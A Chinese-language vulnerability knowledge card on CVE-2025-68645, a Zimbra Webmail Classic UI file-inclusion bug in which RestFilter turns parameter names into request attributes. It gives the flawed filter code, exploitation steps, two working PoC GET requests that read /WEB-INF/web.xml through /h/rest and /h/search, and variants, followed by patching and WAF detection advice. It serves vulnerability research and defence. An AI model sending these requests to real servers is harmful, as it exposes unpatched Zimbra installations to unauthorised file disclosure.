---
id: web-java-component-zimbra-restfilter-param-attribute-lfi
title: Zimbra RestFilter 参数名直转 request 属性：注入 javax.servlet.include.servlet_path 触发 /h/rest 本地文件包含（CVE-2025-68645）
type: scenario
domain: web
path: web/java/component
technique: servlet-param-attribute-injection-lfi
aliases:
- CVE-2025-68645
- Zimbra RestFilter 文件包含
- Zimbra /h/rest LFI
- javax.servlet.include.servlet_path 注入
- RestFilter 属性注入
- Webmail Classic UI 文件包含
tags:
- java
- zimbra
- servlet
- filter
- request-attribute
- file-inclusion
- lfi
- webmail
- cve-2025-68645
cve:
- CVE-2025-68645
severity: high
confidence: high
status: verified
affected_versions: Zimbra Collaboration Suite 10.0 < 10.0.18；10.1 < 10.1.13（原文标记）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V59
  verified_at: '2026-11-05T09:17:23+08:00'
  notes: 已对照原文与3张图核对：图01 CVE-2025-68645（Webmail Classic UI、10.0/10.1、RestFilter、/h/rest、WebRoot 任意文件、CVSS 8.8）；图02 GET /h/rest?javax.servlet.include.servlet_path=/WEB-INF/web.xml 返回200并回显 web.xml；图03 /h/search 带同一参数同样返回200与 web.xml。卡片 RestFilter 参数名直转 setAttribute、/h/* 映射、jsp-property-group 处理 /h/rest、影响版本与修复建议均与原文一致。affected_versions 已存在（10.0<10.0.18；10.1<10.1.13）且与原文影响版本一致。未验证点：PoC 未在本机复跑；原文未给出任意系统文件读取或RCE证据，卡片已限定 WebRoot；frontmatter 无 sources/source_url。
---

## 一句话结论

Zimbra Collaboration 10.0/10.1 的 Webmail Classic UI 中，`RestFilter` 把每个 HTTP 请求参数的「参数名」原样交给 `request.setAttribute()`，未认证攻击者通过 `/h/rest?javax.servlet.include.servlet_path=/WEB-INF/web.xml` 这类请求，可让 JSP 分发逻辑把 WebRoot 目录内的文件内容直接回显到响应中。

## 原理

- `RestFilter` 配置为 `<url-pattern>/h/*</url-pattern>`，因此访问 `/h/rest`、`/h/search` 等路径的请求都会先经过它：

  ```java
  Map<String,String[]> attrMap = request.getParameterMap();
  for (Map.Entry<String, String[]> entry : attrMap.entrySet()) {
      for (String value : entry.getValue()) {
          request.setAttribute(entry.getKey(), value);   // 漏洞点：参数名/值不经过滤
      }
  }
  chain.doFilter(request, response);
  ```

  它把**参数名当作 request 属性名**、参数值当作属性值写入，没有过滤任何以 `javax.servlet.` 开头的保留属性名。

- Servlet/JSP 规范定义了一组由容器在 include/forward 时使用的特殊 request 属性，例如 `javax.servlet.include.servlet_path`、`javax.servlet.include.path_info`、`javax.servlet.include.request_uri`、`javax.servlet.forward.servlet_path`。JSP 引擎在处理请求时若发现这些属性已被设置，会按属性指向的路径包含对应资源。

- Zimbra 的 `web.xml` 又把 `/h/rest` 等端点放进 `<jsp-property-group>`，使其按 JSP 方式处理。于是攻击者用查询参数把 `javax.servlet.include.servlet_path` 设为 `/WEB-INF/web.xml`，Filter 在分发前把它写成 request 属性，JSP 引擎再据此包含目标文件，文件内容出现在响应体中。

- 整个链路中不需要登录：`/h/rest` 端点本身可未认证访问，攻击者控制的是「参数名」这一通常不会被 WAF/业务代码检查的输入位置，因此常规只检查参数值的过滤难以拦截。CVE 描述将影响范围限定为 WebRoot 目录下的任意文件。

## 触发条件

- Zimbra Collaboration Suite 10.0 < 10.0.18，或 10.1 < 10.1.13；Webmail Classic UI 开启且 `/h/*` 可从外部访问。
- 目标文件位于 WebRoot 目录内（如 `/WEB-INF/web.xml`、WebRoot 下的脚本/配置）；容器按 Web 应用上下文解析该路径。
- 请求可控地携带任意参数名（普通 GET 查询串即可），无需认证或特定 Content-Type。
- `/h/rest` 被 `<jsp-property-group>` 配置为 JSP 处理（或同类 `/h/*` 端点）。

## 利用步骤

1. 确认目标为 Zimbra Webmail Classic UI，且 `/h/rest` 可访问。
2. 发送带特殊参数名的请求，把 `javax.servlet.include.servlet_path` 指向 WebRoot 内目标文件。
3. 观察响应：HTTP 200，`Content-Type: text/xml`/`text/html`，正文即目标文件内容（例如 `web.xml` 的 `<web-app ...>` 内容）。
4. 对其他受 `RestFilter` 保护、且被 JSP 属性组覆盖的端点（如 `/h/search`）重复同样参数，同样可触发文件包含。
5. 按需读取 WebRoot 内其他配置、脚本或类资源，收集进一步利用所需信息。

## PoC

```http
GET /h/rest?javax.servlet.include.servlet_path=/WEB-INF/web.xml HTTP/1.1
Host: target
User-Agent: Mozilla/5.0
```

```http
GET /h/search?initial=true&mesg=welcome&javax.servlet.include.servlet_path=/WEB-INF/web.xml HTTP/1.1
Host: target
User-Agent: Mozilla/5.0
```

判定：响应 200，正文为 `web.xml` 内容（`<?xml version="1.0" encoding="ISO-8859-1"?><web-app ...>`），而非正常页面。

## 变体与关联

- 参数名变体：规范中同类的 `javax.servlet.include.path_info`、`javax.servlet.include.request_uri`、`javax.servlet.include.context_path`、`javax.servlet.include.query_string` 以及 `javax.servlet.forward.*` 属性都可能影响分发；原文实测的是 `include.servlet_path`。
- 端点变体：Filter 映射在 `/h/*`，凡经该 Filter 且由 JSP 处理的 `/h/*` 端点均可作为入口；原文以 `/h/rest` 与 `/h/search` 验证。
- 关联思路：任何把用户参数名直接映射为 request 属性/Map key 的 Servlet Filter 或框架（参数→属性绑定、参数名即对象字段名）都可能出现同类「保留属性名注入」，审计时应关注 `setAttribute(request.getParameter...)` 这类写法及未过滤的 `javax.servlet.*` 名称。

## 检测与防御

- 修复：升级 Zimbra Collaboration Suite 10.0 至 >= 10.0.18、10.1 至 >= 10.1.13。
- 代码修复：在 `RestFilter` 中拒绝以 `javax.servlet.` 开头的参数名（建议大小写不敏感地统一前缀过滤），或改用白名单只允许业务需要的属性名。
- 检测：WAF/日志规则匹配参数名以 `javax.servlet.include.`、`javax.servlet.forward.` 开头的请求；重点关注 `/h/rest`、`/h/search` 等端点出现异常参数名、以及返回 `web.xml` 等配置文件内容的 200 响应。
- 加固：不使用 Webmail Classic UI 时关闭/移除相应端点；入口代理剥离可疑参数名；对 `/h/*` 访问做认证与访问控制，并监控异常文件读取响应。
